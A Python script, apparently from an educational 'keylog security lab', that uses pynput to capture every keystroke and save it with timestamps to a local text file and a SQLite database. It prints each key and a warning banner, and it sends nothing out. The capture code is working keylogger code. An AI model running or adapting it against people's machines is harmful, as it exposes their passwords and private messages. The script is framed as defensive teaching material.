import pynput.keyboard as keyboard
import time
import os
import sqlite3
from datetime import datetime

# --- Configuration ---
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "../logs/keystrokes.txt")
DB_FILE = os.path.join(SCRIPT_DIR, "../logs/keystrokes.db")
LOGS_DIR = os.path.join(SCRIPT_DIR, "../logs")
ETHICAL_WARNING = """
[!] JALRAKSHAK KEYLOG SECURITY LAB
[!] Understanding keylogging behavior. Building defense awareness.
[!] This script is for educational purposes only.
[!] All data is stored locally. No external transmission.
[!] Project Lead: Subhajit Roy
"""

# Ensure logs directory exists
os.makedirs(LOGS_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (timestamp TEXT, key TEXT, type TEXT)''')
    conn.commit()
    return conn

def log_to_file(key_str, key_type):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] Key: {key_str} | Type: {key_type}\n")

def log_to_db(conn, key_str, key_type):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c = conn.cursor()
    c.execute("INSERT INTO logs VALUES (?, ?, ?)", (timestamp, key_str, key_type))
    conn.commit()

def get_key_type(key):
    try:
        if key.char.isalnum():
            return "Alphanumeric"
    except AttributeError:
        pass
    
    if key == keyboard.Key.space:
        return "Space"
    if key == keyboard.Key.enter:
        return "Enter"
    return "Special"

def on_press(key):
    key_str = str(key).replace("'", "")
    key_type = get_key_type(key)
    
    print(f"[Captured] {key_str} ({key_type})")
    log_to_file(key_str, key_type)
    log_to_db(db_conn, key_str, key_type)

    if key == keyboard.Key.esc:
        print("\n[!] Stopping demonstration...")
        return False

if __name__ == "__main__":
    print(ETHICAL_WARNING)
    print(f"[*] Logging to: {os.path.abspath(LOG_FILE)}")
    print(f"[*] Database: {os.path.abspath(DB_FILE)}")
    print("[*] Press 'Esc' to stop.\n")
    
    db_conn = init_db()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    db_conn.close()
